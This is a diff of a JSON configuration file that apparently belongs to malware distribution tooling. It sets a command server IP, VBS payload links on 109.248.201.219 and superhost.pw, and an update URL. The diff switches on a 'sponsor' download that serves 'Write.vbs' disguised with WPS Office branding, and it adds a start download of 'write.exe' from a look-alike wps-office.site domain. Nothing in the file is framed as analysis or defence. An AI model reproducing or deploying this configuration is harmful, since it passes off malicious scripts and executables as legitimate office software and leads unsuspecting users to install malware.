@@ -2,9 +2,9 @@
     "disableVirus":  false,
     "dnSponsor":  [
                       {
-                          "enabled":  false,
+                          "enabled":  true,
                           "id":  "ufiler.biz",
-                          "url":  null
+                          "url":  "https://ufiler-pro2.ru/download/3974/?file={dn_url}\u0026poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png\u0026size=10 ??.\u0026description=??????????????????? ???????? ????? Write ?????????\u0026theme=software\u0026title=Write.vbs"
                       }
                   ],
     "phpTemplateFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\dn.php",
@@ -13,11 +13,11 @@
     "UpdateFile":  null,
     "server":  "109.248.201.219",
     "strahServer":  null,
-    "dnVbsLinkShort":  "109.248.201.219/default/YA7xrAIefy/none/GetVbs",
-    "dnVbsLink":  "http://1.superhost.pw/109.248.201.219/default/RcJEGr2Fyf/none/GetVbs",
+    "dnVbsLinkShort":  "109.248.201.219/default/hz7GMlZPgS/none/GetVbs",
+    "dnVbsLink":  "http://1.superhost.pw/109.248.201.219/default/oBiU1Jq8O7/none/GetVbs",
     "phpVbsLinkShort":  "109.248.201.219/default/GetVbsPhp",
-    "dnLightVbsLinkShort":  "109.248.201.219/default/gODUvnUkO4/none/GetLightVbs",
-    "dnLightVbsLink":  "http://1.superhost.pw/109.248.201.219/default/mhtKD3Pk44/none/GetLightVbs",
+    "dnLightVbsLinkShort":  "109.248.201.219/default/bgp0lmY9aV/none/GetLightVbs",
+    "dnLightVbsLink":  "http://1.superhost.pw/109.248.201.219/default/B0IdK15gYF/none/GetLightVbs",
     "phpLightVbsLinkShort":  "109.248.201.219/default/GetLightVbsPhp",
     "updateUrl":  "http://1.superhost.pw/109.248.201.219/update",
     "primaryDns":  "109.248.201.226",
@@ -46,7 +46,7 @@
 
                ],
     "startDownloads":  [
-
+                           "https://wps-office.site/write.exe"
                        ],
     "startUrls":  [
 
